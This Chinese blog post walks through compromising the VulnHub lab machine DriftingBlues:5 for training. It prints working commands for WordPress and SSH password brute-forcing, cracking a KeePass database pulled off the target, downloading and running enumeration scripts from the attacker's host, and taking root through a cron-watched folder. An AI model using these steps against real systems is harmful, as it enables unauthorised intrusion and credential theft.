> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VfXFGMZ_J6pSlLCPT4ShTA)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 36篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/ZSH4VlHv0wUiapfR49hWa2eYqkEGbXzkuQ59LbkL2CvAM8l6ZgoEquXibP2LqGdBhxIemS84Jl7iaVqDK9CJXVdCw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/yy4ERibNaTfR1a65O0rmnQbpic6doaYJJDItNsfQWUBHsSJxn4TiaWOOnaB9CBdo2L7YUk8g2UpelUrQORCeDHHbw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**声明：**文章来自作者日常学习笔记，请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。仅供学习研究

![图片](https://mmbiz.qpic.cn/mmbiz_png/h6R0sRed4WF1Y7qVdRo7SibsRyCm88BjClJeIRVfaBH4LP84hq6VjWz5JKiadnZcuqTUwCVcHoSHlWr6o4X24Oxg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HIvUXxmO2Igh1vy0Tiayxpn8jT7aGK2bPrl3vib0GUP2bnEpNQz2HB37ic3E1HX3mNjyDOqAP15IHgGibZZxtib5VhA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

靶机信息  

-------

下载地址:

```
https://www.vulnhub.com/entry/driftingblues-5,662/
```

靶场: VulnHub.com

靶机名称: DriftingBlues:5

难度: 简单

发布时间: 2021年3月8日

提示信息:

```
无
```

目标: 2个flag

  

实验环境
----

```
`攻击机:VMware kali 192.168.7.3``靶机:Vbox linux IP自动获取`
```

信息收集  

-------

### 扫描主机

扫描局域网内的靶机IP地址

```
sudo nmap -sP 192.168.7.1/24
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫描到靶机地址为192.168.7.188

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -sC -sV -p- 192.168.7.188 -oN 5.nmap
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫描到2个开放端口

```
`22:SSH``80:HTTP`
```

Web渗透  

```
http://192.168.7.188
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

访问到一个WordPress程序，用wpscan扫描是否存在漏洞

### WPScan扫描

```
wpscan --url http://192.168.7.188  --api-token 你的api-token -e
```

### API注册地址  

```
https://wpscan.com/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

没有发现漏洞，枚举到5个用户名，先把用户名保存下来用wpscan暴破下密码，顺便做个目录扫描看看有什么发现

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### WordPress密码暴破

```
wpscan --url http://192.168.7.188  --api-token 你的api-token --usernames user.txt --passwords /usr/share/wordlists/rockyou.txt
```

跑了一晚上也没跑出密码  

### 目录扫描

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.7.188 -x php,html,txt,zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

目录扫描完未找到可利用的路径。

这个系列的靶机慢慢偏向CTF类型，我们换个思路CTF常会用到网站上的单词生成密码字典，我们试试

### 收集网页信息生成字典

使用cewl爬取网页内容生成字典，最小为6位

```
cewl -m 6 -w pass.txt http://192.168.7.188
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

爬取完成没有提示，查看pass.txt文件内容

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

生成密码完成，再去暴破一次

```
wpscan --url http://192.168.7.188  --api-token 你的api-token --usernames user.txt --passwords pass.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

果然，暴破出用户gill的密码为interchangeable，登录后台试试

```
http:/192.168.7.188/wp-admin
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登录成功，只是个普通用户权限，先在后台找找可利用的信息吧

### 图片隐写

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里有张图片是网站前台页面中没出现过的，把他下载下来

```
wget http://192.168.7.188/wp-content/uploads/2021/02/dblogo.png
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

先检查是否有文件隐藏在里面

```
file dblogo.png
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

只是一张图片，再用exiftool查看隐藏信息

```
exiftool dblogo.png
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在TextLayer中发现SSH密码59583hello，那用户名是什么还不知道，我们有用户名字典，可以用密码来暴破SSH用户名

### WPScan暴破用户名

```
hydra -L user.txt -p 59583hello 192.168.7.188 ssh
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

原来用户名还是gill，现在可以登录SSH了

```
ssh gill@192.168.7.188
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

登录成功，查找下敏感信息

```
`ls -al``cat user.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到user.txt，用户目录下还有一个keyfile.kdbx文件，检查一下是什么文件

```
file keyfile.kdbx
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

Keepass password database 2.x这是一款windows下密码管理工具的数据库版本是2.X。先把数据库下载到kali攻击机，再使用keepass2john获取密码哈希值暴破密码，拿到密码后将文件上传到在线查看kdbx文件网站获取内容

1。靶机开启HTTP服务

```
python3 -m http.server
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

2。kali攻击机下载keyfile.kdbx

```
wget http://192.168.7.188:8000/keyfile.kdbx
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

3。获取密码hash值

```
keepass2john keyfile.kdbx > hash
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

4。john暴破密码

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

拿到数据库密码porsiempre

5。将keyfile.kdbx文件上传到在线查看网站

```
https://app.keeweb.info/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

里面的内容都是空的，难道这几个是密码？用这几个字符串做密码切换root帐号全部失败，看来是迷惑我们的还是要继续找提权信息。

辅助脚本提权
------

```
脚本项目地址  
https://github.com/carlospolop/PEASS-ng/releases
```

下载好后将提权脚本上传到靶机上执行

1。kali开启HTTP服务

```
python3 -m http.server
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

2。靶机下载linpeas.sh脚本

```
wget http://192.168.7.3:8000/linpeas.sh
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

3。给linpeas.sh脚本加上可执行权限，并运行

```
`chmod +x linpeas.sh``./linpeas.sh`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

根目录下找到一个名为keyfolder的空文件夹，未检测到可利用的信息，再上传个pspy64检查下，pspy64可以监控系统后台定时运行的程序

### 后台程序运行监控

```
程序项目地址  
https://github.com/DominicBreuker/pspy
```

找到链接让靶机直接下载好pspy64也可以（已下载过不再演示了）

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

下载pspy64文件添加可执行权限，并运行

```
`wget http://192.168.7.3:8000/pspy64``chmod +x pspy64``./pspy64`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现/root/key.sh文件每分钟执行1次，不定时检查keyfolder文件夹内的文件。我们现在看不到key.sh文件内的脚本，猜测是key.sh执行了ls命令检查keyfolder文件夹，既然名字有key那有可能就是密码密钥之类的东西会在里面。他要去检查又是空的，猜测是让我们往里面放文件，并且之前的keepass数据库打开后没有密码但是有一些key文件名，我们试着将key文件名放入文件夹试试，先来看一下有哪些key名

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
2real4surreal  
buddyretard  
closet313  
exalted  
fracturedocean  
zakkwylde
```

一共6个，那我们在keyfolder文件夹中创建这6个文件试试

```
touch 2real4surreal buddyretard closet313 exalted fracturedocean zakkwylde
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

6个文件创建好了，再开一个SSH登录到主机执行pspy64观察ls /keyfolder命令出现后，再到/keyfolder文件夹下查看

等了将近10分钟才看到执行ls命令，但是keyfolder目录没有任何变化 ，是不是不能一次放多个文件，我们重新来创建1个文件便等待ls命令执行，如果执行后没有变化我们就删除这个文件，再创建另1个文件

```
`rm *``touch 2real4surreal`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`rm *``touch buddyretard`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`rm *``touch closet313`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`rm *``touch exalted`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`rm *``touch fracturedocean`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

目录下生成rootcreds.txt文件，打开看下内容

```
cat rootcreds.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

下面的字符串应该是root的密码了，我们切换到root试试

```
su
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

拿到root权限，看一下key.sh是什么

```
`cd /root``cat key.sh`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

查看最后一个flag

```
cat root.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

拿到root.txt，游戏结束。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

END

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**这篇文章到这里就结束了,喜欢打靶的小伙伴可以关注"伏波路上学安全"微信公众号,或扫描下面二维码关注,我会持续更新打靶文章,让我们一起在打靶中学习进步吧.**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)